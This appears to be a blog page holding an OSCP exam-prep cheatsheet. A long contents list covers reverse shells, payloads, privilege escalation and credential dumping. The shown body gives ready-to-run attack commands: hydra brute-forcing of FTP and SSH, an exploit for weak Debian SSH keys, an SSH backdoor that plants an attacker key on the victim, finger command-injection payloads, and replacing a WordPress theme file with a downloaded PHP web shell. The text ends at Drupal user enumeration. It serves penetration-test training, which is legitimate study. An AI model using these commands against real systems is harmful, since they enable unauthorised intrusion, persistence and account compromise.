<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/logbook/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.261744067.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>OSCP Cheatsheet</title><meta content=article property=og:type><meta content="OSCP Cheatsheet" property=og:title><meta name=Description content="
This is an cheatsheet for OSCP preparations.

 "><meta content="
This is an cheatsheet for OSCP preparations.

 " property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="OSCP Cheatsheet"><meta name=twitter:description content="
This is an cheatsheet for OSCP preparations.

 "><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Dec 2, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="31 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper class=svelte-1u41owj src=as-logo2.ico> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog class="svelte-16qpxtx selected" rel=prefetch>Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>December 2, 2021 ~ 31 min read</p> <h1 class=svelte-ww3xvk>OSCP Cheatsheet</h1> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=oscp-cheatsheet>OSCP Cheatsheet</h1> <ul> <li><p><a href=javascript:; onclick="document.location.hash='enumeration';">Enumeration</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='nmap';">NMAP</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='tcp';">TCP</a></li> <li><a href=javascript:; onclick="document.location.hash='udp';">UDP</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='ftp---21';">FTP - 21</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='downloading-file';">Downloading file</a></li> <li><a href=javascript:; onclick="document.location.hash='uploading-file';">Uploading file</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='ssh---22';">SSH - 22</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force-1';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='cve-2008-0166';">CVE-2008-0166</a></li> <li><a href=javascript:; onclick="document.location.hash='ssh-backdoor---post-exploitation';">SSH backdoor - post exploitation</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='dns---53';">DNS - 53</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='zone-transfert';">Zone transfert</a></li> <li><a href=javascript:; onclick="document.location.hash='dns-brute-force';">DNS brute force</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='finger---79';">FINGER - 79</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='user-enumeration';">User enumeration</a></li> <li><a href=javascript:; onclick="document.location.hash='command-execution';">Command execution</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='http---https---80---443';">HTTP - HTTPS - 80 - 443</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='automatic-scanners';">Automatic scanners</a></li> <li><a href=javascript:; onclick="document.location.hash='wordpress';">Wordpress</a><ul> <li><a href=javascript:; onclick="document.location.hash='wordpress-panel-rce';">Wordpress panel RCE</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='drupal';">Drupal</a><ul> <li><a href=javascript:; onclick="document.location.hash='username-enumeration';">Username enumeration</a></li> <li><a href=javascript:; onclick="document.location.hash='hidden-pages-enumeration';">Hidden pages enumeration</a></li> <li><a href=javascript:; onclick="document.location.hash='drupal-panel-rce';">Drupal panel RCE</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='joomla';">Joomla</a></li> <li><a href=javascript:; onclick="document.location.hash='tomcat';">Tomcat</a><ul> <li><a href=javascript:; onclick="document.location.hash='default-credentials';">Default credentials</a></li> <li><a href=javascript:; onclick="document.location.hash='brute-force-2';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='tomcat-panel-rce';">Tomcat panel RCE</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='webdav';">WebDav</a></li> <li><a href=javascript:; onclick="document.location.hash='http-brute-force-authentication';">HTTP brute force authentication</a><ul> <li><a href=javascript:; onclick="document.location.hash='http-basic-authentication';">HTTP basic authentication</a></li> <li><a href=javascript:; onclick="document.location.hash='http-get-request';">HTTP GET request</a></li> <li><a href=javascript:; onclick="document.location.hash='http-post-request';">HTTP POST request</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='spidering--brute-force-directories--files';">Spidering / Brute force directories / files</a><ul> <li><a href=javascript:; onclick="document.location.hash='file-backups';">File backups</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='local-file-inclusion--remote-file-inclusion---lfi--rfi';">Local File Inclusion / Remote File Inclusion - LFI / RFI</a><ul> <li><a href=javascript:; onclick="document.location.hash='wrappers';">Wrappers</a><ul> <li><a href=javascript:; onclick="document.location.hash='wrapper-phpfilter';">Wrapper php://filter</a></li> <li><a href=javascript:; onclick="document.location.hash='wrapper-expect';">Wrapper expect://</a></li> <li><a href=javascript:; onclick="document.location.hash='wrapper-data';">Wrapper data://</a></li> <li><a href=javascript:; onclick="document.location.hash='wrapper-input';">Wrapper input://</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='useful-lfi-list';">Useful LFI list</a></li> <li><a href=javascript:; onclick="document.location.hash='tools';">Tools</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='command-injection';">Command injection</a></li> <li><a href=javascript:; onclick="document.location.hash='deserialization';">Deserialization</a></li> <li><a href=javascript:; onclick="document.location.hash='file-upload';">File upload</a></li> <li><a href=javascript:; onclick="document.location.hash='sql-injection';">SQL injection</a></li> <li><a href=javascript:; onclick="document.location.hash='xss';">XSS</a></li> <li><a href=javascript:; onclick="document.location.hash='other-web-vulnerabilities';">Other web vulnerabilities</a></li> <li><a href=javascript:; onclick="document.location.hash='upload-a-file-with-put';">Upload a file with PUT</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='kerberos---88';">KERBEROS - 88</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='pop3---110';">POP3 - 110</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force-3';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='read-mail';">Read mail</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='snmp---161';">SNMP - 161</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force-community-string';">Brute force community string</a></li> <li><a href=javascript:; onclick="document.location.hash='modifying-snmp-values';">Modifying SNMP values</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='ldap---389';">LDAP - 389</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='scans';">Scans</a></li> <li><a href=javascript:; onclick="document.location.hash='graphical-interface';">Graphical Interface</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='smb---445';">SMB - 445</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='version-if-nmap-didnt-detect-it';">Version if nmap didn't detect it</a></li> <li><a href=javascript:; onclick="document.location.hash='scan-for-vulnerability';">Scan for vulnerability</a></li> <li><a href=javascript:; onclick="document.location.hash='manual-testing';">Manual testing</a></li> <li><a href=javascript:; onclick="document.location.hash='brute-force-4';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='mount-a-smb-share';">Mount a SMB share</a></li> <li><a href=javascript:; onclick="document.location.hash='get-a-shell';">Get a shell</a></li> <li><a href=javascript:; onclick="document.location.hash='EternalBlue-MS17-010';">EternalBlue (MS17-010)</a><ul> <li><a href=javascript:; onclick="document.location.hash='check-if-vulnerable';">Check if vulnerable</a></li> <li><a href=javascript:; onclick="document.location.hash='prepare-shellcodes-and-listeners';">Prepare shellcodes and listeners</a></li> <li><a href=javascript:; onclick="document.location.hash='exploit';">Exploit</a></li> <li><a href=javascript:; onclick="document.location.hash='if-this-doesnt-work-try-this-one';">If this doesn't work, try this one</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='ms08-067';">MS08-067</a></li> <li><a href=javascript:; onclick="document.location.hash='cve-2017-7494';">CVE-2017-7494</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='mssql---1433';">MSSQL - 1433</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='get-information';">Get information</a></li> <li><a href=javascript:; onclick="document.location.hash='brute-force-5';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='having-credentials';">Having credentials</a></li> <li><a href=javascript:; onclick="document.location.hash='manual-exploit';">Manual exploit</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='nfs---2049';">NFS - 2049</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='show-mountable-nfs-shares';">Show Mountable NFS Shares</a></li> <li><a href=javascript:; onclick="document.location.hash='mount-a-share';">Mount a share</a></li> <li><a href=javascript:; onclick="document.location.hash='nfs-misconfigurations';">NFS misconfigurations</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='mysql---3306';">MYSQL - 3306</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force-6';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='extracting-mysql-credentials-from-files';">Extracting MySQL credentials from files</a></li> <li><a href=javascript:; onclick="document.location.hash='connect';">Connect</a></li> <li><a href=javascript:; onclick="document.location.hash='mysql-commands';">MySQL commands</a></li> <li><a href=javascript:; onclick="document.location.hash='manual-exploit-1';">Manual exploit</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='rdp---3389';">RDP - 3389</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='connect-with-known-credentials--hash';">Connect with known credentials / hash</a></li> <li><a href=javascript:; onclick="document.location.hash='session-stealing';">Session stealing</a><ul> <li><a href=javascript:; onclick="document.location.hash='get-openned-sessions';">Get openned sessions</a></li> <li><a href=javascript:; onclick="document.location.hash='access-to-the-selected';">Access to the selected</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='adding-user-to-rdp-group-windows';">Adding user to RDP group (Windows)</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='vnc---5800---58001---5900---5901';">VNC - 5800 - 58001 - 5900 - 5901</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='scans-1';">Scans</a></li> <li><a href=javascript:; onclick="document.location.hash='brute-force-8';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='connect-1';">Connect</a></li> <li><a href=javascript:; onclick="document.location.hash='found-vnc-password';">Found VNC password</a><ul> <li><a href=javascript:; onclick="document.location.hash='linux';">Linux</a></li> <li><a href=javascript:; onclick="document.location.hash='windows';">Windows</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='decrypt-vnc-password';">Decrypt VNC password</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='winrm---5985---5986';">WINRM - 5985 - 5986</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='brute-force-9';">Brute force</a></li> <li><a href=javascript:; onclick="document.location.hash='connecting';">Connecting</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='cgi';">CGI</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='found-cgi-scripts';">Found CGI scripts</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='command-and-control-framework';">Command and control framework</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='compiling-exploits';">Compiling exploits</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='for-linux';">For linux</a></li> <li><a href=javascript:; onclick="document.location.hash='for-windows';">For windows</a></li> <li><a href=javascript:; onclick="document.location.hash='cross-compile';">Cross compile</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='dictionary-generation';">DICTIONARY GENERATION</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='file-transfer';">FILE TRANSFER</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='linux-1';">Linux</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-1';">Windows</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='git';">GIT</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='download-git';">Download .git</a></li> <li><a href=javascript:; onclick="document.location.hash='extract-git-content';">Extract .git content</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='hashes';">HASHES</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='windows-2';">Windows</a></li> <li><a href=javascript:; onclick="document.location.hash='linux-2';">Linux</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='mimikatz';">MIMIKATZ</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='miscellaneous';">MISCELLANEOUS</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='get-a-windows-path-without-spaces';">Get a Windows path without spaces</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='msfvenom-payload';">MSFVENOM PAYLOAD</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='linux-3';">Linux</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-3';">Windows</a></li> <li><a href=javascript:; onclick="document.location.hash='php';">PHP</a></li> <li><a href=javascript:; onclick="document.location.hash='asp';">ASP</a></li> <li><a href=javascript:; onclick="document.location.hash='jsp';">JSP</a></li> <li><a href=javascript:; onclick="document.location.hash='war';">WAR</a></li> <li><a href=javascript:; onclick="document.location.hash='python';">Python</a></li> <li><a href=javascript:; onclick="document.location.hash='bash';">Bash</a></li> <li><a href=javascript:; onclick="document.location.hash='perl';">Perl</a></li> <li><a href=javascript:; onclick="document.location.hash='listener';">Listener</a><ul> <li><a href=javascript:; onclick="document.location.hash='metasploit';">Metasploit</a></li> <li><a href=javascript:; onclick="document.location.hash='netcat';">Netcat</a></li> </ul> </li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='password-cracking';">PASSWORD CRACKING</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='online';">Online</a></li> <li><a href=javascript:; onclick="document.location.hash='hashcat';">Hashcat</a><ul> <li><a href=javascript:; onclick="document.location.hash='linux-password';">Linux password</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-password';">Windows password</a></li> <li><a href=javascript:; onclick="document.location.hash='others';">Others</a></li> <li><a href=javascript:; onclick="document.location.hash='rules';">Rules</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='john';">John</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='pivoting';">PIVOTING</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='sshuttle';">Sshuttle</a></li> <li><a href=javascript:; onclick="document.location.hash='proxychains';">Proxychains</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='privile-escalation';">PRIVILE ESCALATION</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='linux-4';">Linux</a><ul> <li><a href=javascript:; onclick="document.location.hash='enumeration-scripts';">Enumeration scripts</a></li> <li><a href=javascript:; onclick="document.location.hash='vulnerability-scan';">Vulnerability scan</a></li> <li><a href=javascript:; onclick="document.location.hash='suid-checker';">Suid checker</a></li> <li><a href=javascript:; onclick="document.location.hash='methodology-to-follow';">Methodology to follow</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='windows-4';">Windows</a><ul> <li><a href=javascript:; onclick="document.location.hash='enumeration-scripts-1';">Enumeration scripts</a><ul> <li><a href=javascript:; onclick="document.location.hash='general-scans';">General scans</a></li> <li><a href=javascript:; onclick="document.location.hash='search-for-cve';">Search for CVE</a></li> <li><a href=javascript:; onclick="document.location.hash='post-exploitation';">Post exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='juicypotato-seimpersonate-or-seassignprimarytoken';">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</a></li> <li><a href=javascript:; onclick="document.location.hash='methodology-to-follow-1';">Methodology to follow</a></li> <li><a href=javascript:; onclick="document.location.hash='autorun';">Autorun</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='alwaysinstallelevated';">AlwaysInstallElevated</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection-1';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation-1';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='executable-files';">Executable Files</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection-2';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation-2';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='startup-applications';">Startup applications</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection-3';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation-3';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='weak-service-permission';">Weak service permission</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection-4';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation-4';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='unquoted-service-paths';">Unquoted service paths</a><ul> <li><a href=javascript:; onclick="document.location.hash='detection-5';">Detection</a></li> <li><a href=javascript:; onclick="document.location.hash='exploitation-5';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='hot-potato';">Hot potato</a><ul> <li><a href=javascript:; onclick="document.location.hash='exploitation-6';">Exploitation</a></li> </ul> </li> <li><a href=javascript:; onclick="document.location.hash='cve';">CVE</a><ul> <li><a href=javascript:; onclick="document.location.hash='windows-xp';">Windows XP</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-7';">Windows 7</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-8';">Windows 8</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-10';">Windows 10</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-server-2003';">Windows Server 2003</a></li> </ul> </li> </ul> </li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='proofs';">PROOFS</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='linux-5';">Linux</a></li> <li><a href=javascript:; onclick="document.location.hash='windows-5';">Windows</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='reverse-shell';">REVERSE SHELL</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='amazing-tool-for-shell-generation';">Amazing tool for shell generation</a></li> <li><a href=javascript:; onclick="document.location.hash='bash-1';">Bash</a></li> <li><a href=javascript:; onclick="document.location.hash='perl-1';">Perl</a></li> <li><a href=javascript:; onclick="document.location.hash='python-1';">Python</a></li> <li><a href=javascript:; onclick="document.location.hash='netcat-1';">Netcat</a></li> <li><a href=javascript:; onclick="document.location.hash='more-reverse-shell';">More reverse shell</a></li> <li><a href=javascript:; onclick="document.location.hash='interactive-shell';">Interactive shell</a></li> <li><a href=javascript:; onclick="document.location.hash='adjust-interactive-shell';">Adjust Interactive shell</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='shellshock';">SHELLSHOCK</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='useful-linux-commands';">USEFUL LINUX COMMANDS</a></p> <ul> <li><a href=javascript:; onclick="document.location.hash='find-a-file';">Find a file</a></li> <li><a href=javascript:; onclick="document.location.hash='active-connection';">Active connection</a></li> <li><a href=javascript:; onclick="document.location.hash='list-all-suid-files';">List all SUID files</a></li> <li><a href=javascript:; onclick="document.location.hash='determine-the-current-version-of-linux';">Determine the current version of Linux</a></li> <li><a href=javascript:; onclick="document.location.hash='determine-more-information-about-the-environment';">Determine more information about the environment</a></li> <li><a href=javascript:; onclick="document.location.hash='list-processes-running';">List processes running</a></li> <li><a href=javascript:; onclick="document.location.hash='list-the-allowed-and-forbidden-commands-for-the-invoking-use';">List the allowed (and forbidden) commands for the invoking use</a></li> </ul> </li> <li><p><a href=javascript:; onclick="document.location.hash='useful-windows-commands';">USEFUL WINDOWS COMMANDS</a></p> </li> <li><p><a href=javascript:; onclick="document.location.hash='zip';">ZIP</a></p> </li> </ul> <hr> <h2 id=enumeration>Enumeration</h2> <pre class=language-><code class=language->nmap -sn -v <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/CIDR</code></pre><pre class=language-><code class=language->nmapAutomator <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> All</code></pre><pre class=language-><code class=language->autorecon <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/CIDR</code></pre><hr> <h2 id=nmap>NMAP</h2> <h3 id=tcp>TCP</h3> <pre class=language-><code class=language->sudo -sS -sC -sV -oA <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NAME</span><span class="token punctuation">></span></span>.tcp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -v</code></pre><h3 id=udp>UDP</h3> <pre class=language-><code class=language->sudo -sU -sS -sC -sV -oA <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NAME</span><span class="token punctuation">></span></span>.udp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -v</code></pre><hr> <h2 id=ftp---21>FTP - 21</h2> <h3 id=brute-force>Brute force</h3> <pre class=language-><code class=language->hydra -V -f -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> ftp://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u -vV</code></pre><h3 id=downloading-file>Downloading file</h3> <pre class=language-><code class=language->ftp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
PASSIVE
BINARY
get <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span></code></pre><h3 id=uploading-file>Uploading file</h3> <pre class=language-><code class=language->ftp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
PASSIVE
BINARY
put <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=ssh---22>SSH - 22</h2> <h3 id=brute-force-1>Brute force</h3> <pre class=language-><code class=language->hydra -V -f -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> ssh://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u -vV</code></pre><h3 id=cve-2008-0166>CVE-2008-0166</h3> <pre class=language-><code class=language->All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS</span><span class="token punctuation">></span></span>
python 5720 dsa/1024 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS</span><span class="token punctuation">></span></span></code></pre><h3 id=ssh-backdoor---post-exploitation>SSH backdoor - post exploitation</h3> <pre class=language-><code class=language-># Attacker
ssh-keygen -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILENAME</span><span class="token punctuation">></span></span>
chmod 600 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILENAME</span><span class="token punctuation">></span></span>
cat <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILENAME</span><span class="token punctuation">></span></span>.pub -> copy

# Victim
echo <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILENAME</span><span class="token punctuation">></span></span>.pub >> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>/.ssh/authorized_keys

# Connect
ssh -i <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILENAME</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=dns---53>DNS - 53</h2> <pre class=language-><code class=language->dnsenum <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span></code></pre><pre class=language-><code class=language->dnsrecon -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span></code></pre><h3 id=zone-transfert>Zone transfert</h3> <pre class=language-><code class=language->dnsrecon -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span> -a
dig axfr <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span> @ns1.test.com</code></pre><h3 id=dns-brute-force>DNS brute force</h3> <pre class=language-><code class=language->https://github.com/blark/aiodnsbrute</code></pre><hr> <h2 id=finger---79>FINGER - 79</h2> <h3 id=user-enumeration>User enumeration</h3> <pre class=language-><code class=language->finger @<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
finger <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=command-execution>Command execution</h3> <pre class=language-><code class=language->finger "|/bin/id@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>"
finger "|/bin/ls -a /<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>"</code></pre><hr> <h2 id=http---https---80---443>HTTP - HTTPS - 80 - 443</h2> <h3 id=automatic-scanners>Automatic scanners</h3> <pre class=language-><code class=language->nikto -h <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>
python crawleet.py -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20</code></pre><h3 id=wordpress>Wordpress</h3> <pre class=language-><code class=language-># Scan
wpscan --rua -e --url <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>

# Brute force user(s)
wpscan --rua --url <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -U "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>"</code></pre><h4 id=wordpress-panel-rce>Wordpress panel RCE</h4> <pre class=language-><code class=language->Modifying a php from the theme used (admin credentials needed)

Appearance -> Editor -> 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/wp-content/themes/twentytwelve/404.php</code></pre><h3 id=drupal>Drupal</h3> <pre class=language-><code class=language->droopescan scan -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span></code></pre><h4 id=username-enumeration>Username enumeration</h4> <pre class=language-><code class=language->In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

